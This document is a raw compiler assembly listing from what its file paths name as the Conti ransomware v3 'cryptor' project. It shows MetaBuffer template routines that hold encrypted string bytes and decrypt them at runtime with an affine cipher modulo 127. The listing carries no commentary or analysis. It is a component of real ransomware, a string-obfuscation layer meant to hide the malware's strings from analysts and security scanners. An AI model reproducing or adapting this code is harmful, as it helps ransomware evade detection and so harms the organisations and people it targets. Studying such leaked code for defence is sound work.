??0?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 60 00 00
	00		 mov	 r11d, 96		; 00000060H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 33	 sub	 ecx, 51			; 00000033H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 29	 imul	 r8d, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 60	 mov	 BYTE PTR [rcx+1], 96	; 00000060H
  00007	c6 41 02 33	 mov	 BYTE PTR [rcx+2], 51	; 00000033H
  0000b	c6 41 03 0a	 mov	 BYTE PTR [rcx+3], 10
  0000f	c6 41 04 33	 mov	 BYTE PTR [rcx+4], 51	; 00000033H
  00013	c6 41 05 20	 mov	 BYTE PTR [rcx+5], 32	; 00000020H
  00017	c6 41 06 33	 mov	 BYTE PTR [rcx+6], 51	; 00000033H
  0001b	c6 41 07 75	 mov	 BYTE PTR [rcx+7], 117	; 00000075H
  0001f	c6 41 08 33	 mov	 BYTE PTR [rcx+8], 51	; 00000033H
  00023	c6 41 09 5b	 mov	 BYTE PTR [rcx+9], 91	; 0000005bH
  00027	c6 41 0a 33	 mov	 BYTE PTR [rcx+10], 51	; 00000033H
  0002b	c6 41 0b 1b	 mov	 BYTE PTR [rcx+11], 27
  0002f	c6 41 0c 33	 mov	 BYTE PTR [rcx+12], 51	; 00000033H
  00033	c6 41 0d 39	 mov	 BYTE PTR [rcx+13], 57	; 00000039H
  00037	c6 41 0e 33	 mov	 BYTE PTR [rcx+14], 51	; 00000033H
  0003b	c6 41 0f 1d	 mov	 BYTE PTR [rcx+15], 29
  0003f	c6 41 10 33	 mov	 BYTE PTR [rcx+16], 51	; 00000033H
  00043	c6 41 11 04	 mov	 BYTE PTR [rcx+17], 4
  00047	c6 41 12 33	 mov	 BYTE PTR [rcx+18], 51	; 00000033H
  0004b	c6 41 13 5b	 mov	 BYTE PTR [rcx+19], 91	; 0000005bH
  0004f	c6 41 14 33	 mov	 BYTE PTR [rcx+20], 51	; 00000033H
  00053	c6 41 15 07	 mov	 BYTE PTR [rcx+21], 7
  00057	c6 41 16 33	 mov	 BYTE PTR [rcx+22], 51	; 00000033H
  0005b	c6 41 17 1b	 mov	 BYTE PTR [rcx+23], 27
  0005f	c6 41 18 33	 mov	 BYTE PTR [rcx+24], 51	; 00000033H
  00063	c6 41 19 42	 mov	 BYTE PTR [rcx+25], 66	; 00000042H
  00067	c6 41 1a 33	 mov	 BYTE PTR [rcx+26], 51	; 00000033H
  0006b	c6 41 1b 07	 mov	 BYTE PTR [rcx+27], 7
  0006f	c6 41 1c 33	 mov	 BYTE PTR [rcx+28], 51	; 00000033H
  00073	c6 41 1d 77	 mov	 BYTE PTR [rcx+29], 119	; 00000077H
  00077	c6 41 1e 33	 mov	 BYTE PTR [rcx+30], 51	; 00000033H
  0007b	c6 41 1f 1b	 mov	 BYTE PTR [rcx+31], 27
  0007f	c6 41 20 33	 mov	 BYTE PTR [rcx+32], 51	; 00000033H
  00083	c6 41 21 26	 mov	 BYTE PTR [rcx+33], 38	; 00000026H
  00087	c6 41 22 33	 mov	 BYTE PTR [rcx+34], 51	; 00000033H
  0008b	c6 41 23 3f	 mov	 BYTE PTR [rcx+35], 63	; 0000003fH
  0008f	c6 41 24 33	 mov	 BYTE PTR [rcx+36], 51	; 00000033H
  00093	c6 41 25 1d	 mov	 BYTE PTR [rcx+37], 29
  00097	c6 41 26 33	 mov	 BYTE PTR [rcx+38], 51	; 00000033H
  0009b	c6 41 27 1b	 mov	 BYTE PTR [rcx+39], 27
  0009f	c6 41 28 33	 mov	 BYTE PTR [rcx+40], 51	; 00000033H
  000a3	c6 41 29 26	 mov	 BYTE PTR [rcx+41], 38	; 00000026H
  000a7	c6 41 2a 33	 mov	 BYTE PTR [rcx+42], 51	; 00000033H
  000ab	c6 41 2b 04	 mov	 BYTE PTR [rcx+43], 4
  000af	c6 41 2c 33	 mov	 BYTE PTR [rcx+44], 51	; 00000033H
  000b3	c6 41 2d 61	 mov	 BYTE PTR [rcx+45], 97	; 00000061H
  000b7	c6 41 2e 33	 mov	 BYTE PTR [rcx+46], 51	; 00000033H
  000bb	c6 41 2f 07	 mov	 BYTE PTR [rcx+47], 7
  000bf	c6 41 30 33	 mov	 BYTE PTR [rcx+48], 51	; 00000033H
  000c3	c6 41 31 1b	 mov	 BYTE PTR [rcx+49], 27
  000c7	c6 41 32 33	 mov	 BYTE PTR [rcx+50], 51	; 00000033H
  000cb	c6 41 33 37	 mov	 BYTE PTR [rcx+51], 55	; 00000037H
  000cf	c6 41 34 33	 mov	 BYTE PTR [rcx+52], 51	; 00000033H
  000d3	c6 41 35 3c	 mov	 BYTE PTR [rcx+53], 60	; 0000003cH
  000d7	c6 41 36 33	 mov	 BYTE PTR [rcx+54], 51	; 00000033H
  000db	c6 41 37 50	 mov	 BYTE PTR [rcx+55], 80	; 00000050H
  000df	c6 41 38 33	 mov	 BYTE PTR [rcx+56], 51	; 00000033H
  000e3	c6 41 39 1b	 mov	 BYTE PTR [rcx+57], 27
  000e7	c6 41 3a 33	 mov	 BYTE PTR [rcx+58], 51	; 00000033H
  000eb	c6 41 3b 5d	 mov	 BYTE PTR [rcx+59], 93	; 0000005dH
  000ef	c6 41 3c 33	 mov	 BYTE PTR [rcx+60], 51	; 00000033H
  000f3	c6 41 3d 07	 mov	 BYTE PTR [rcx+61], 7
  000f7	c6 41 3e 33	 mov	 BYTE PTR [rcx+62], 51	; 00000033H
  000fb	c6 41 3f 5b	 mov	 BYTE PTR [rcx+63], 91	; 0000005bH
  000ff	c6 41 40 33	 mov	 BYTE PTR [rcx+64], 51	; 00000033H
  00103	c6 41 41 79	 mov	 BYTE PTR [rcx+65], 121	; 00000079H
  00107	c6 41 42 33	 mov	 BYTE PTR [rcx+66], 51	; 00000033H
  0010b	c6 41 43 0a	 mov	 BYTE PTR [rcx+67], 10
  0010f	c6 41 44 33	 mov	 BYTE PTR [rcx+68], 51	; 00000033H
  00113	c6 41 45 3c	 mov	 BYTE PTR [rcx+69], 60	; 0000003cH
  00117	c6 41 46 33	 mov	 BYTE PTR [rcx+70], 51	; 00000033H
  0011b	c6 41 47 5b	 mov	 BYTE PTR [rcx+71], 91	; 0000005bH
  0011f	c6 41 48 33	 mov	 BYTE PTR [rcx+72], 51	; 00000033H
  00123	c6 41 49 1f	 mov	 BYTE PTR [rcx+73], 31
  00127	c6 41 4a 33	 mov	 BYTE PTR [rcx+74], 51	; 00000033H
  0012b	c6 41 4b 1d	 mov	 BYTE PTR [rcx+75], 29
  0012f	c6 41 4c 33	 mov	 BYTE PTR [rcx+76], 51	; 00000033H
  00133	c6 41 4d 1d	 mov	 BYTE PTR [rcx+77], 29
  00137	c6 41 4e 33	 mov	 BYTE PTR [rcx+78], 51	; 00000033H
  0013b	c6 41 4f 3f	 mov	 BYTE PTR [rcx+79], 63	; 0000003fH
  0013f	c6 41 50 33	 mov	 BYTE PTR [rcx+80], 51	; 00000033H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00143	c6 41 51 1d	 mov	 BYTE PTR [rcx+81], 29
  00147	c6 41 52 33	 mov	 BYTE PTR [rcx+82], 51	; 00000033H
  0014b	c6 41 53 1b	 mov	 BYTE PTR [rcx+83], 27
  0014f	c6 41 54 33	 mov	 BYTE PTR [rcx+84], 51	; 00000033H
  00153	c6 41 55 25	 mov	 BYTE PTR [rcx+85], 37	; 00000025H
  00157	c6 41 56 33	 mov	 BYTE PTR [rcx+86], 51	; 00000033H
  0015b	c6 41 57 1b	 mov	 BYTE PTR [rcx+87], 27
  0015f	c6 41 58 33	 mov	 BYTE PTR [rcx+88], 51	; 00000033H
  00163	c6 41 59 37	 mov	 BYTE PTR [rcx+89], 55	; 00000037H
  00167	c6 41 5a 33	 mov	 BYTE PTR [rcx+90], 51	; 00000033H
  0016b	c6 41 5b 61	 mov	 BYTE PTR [rcx+91], 97	; 00000061H
  0016f	c6 41 5c 33	 mov	 BYTE PTR [rcx+92], 51	; 00000033H
  00173	c6 41 5d 7a	 mov	 BYTE PTR [rcx+93], 122	; 0000007aH
  00177	c6 41 5e 33	 mov	 BYTE PTR [rcx+94], 51	; 00000033H
  0017b	c6 41 5f 33	 mov	 BYTE PTR [rcx+95], 51	; 00000033H
  0017f	c6 41 60 33	 mov	 BYTE PTR [rcx+96], 51	; 00000033H
  00183	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]

; 52   :     {
; 53   : 
; 54   :     }

  00187	48 8b c1	 mov	 rax, rcx
  0018a	c3		 ret	 0
??0?$MetaBuffer@$0BP@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::MetaBuffer<31,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 60 00 00
	00		 mov	 r10d, 96		; 00000060H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 54 00 00 00	 mov	 eax, 84			; 00000054H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
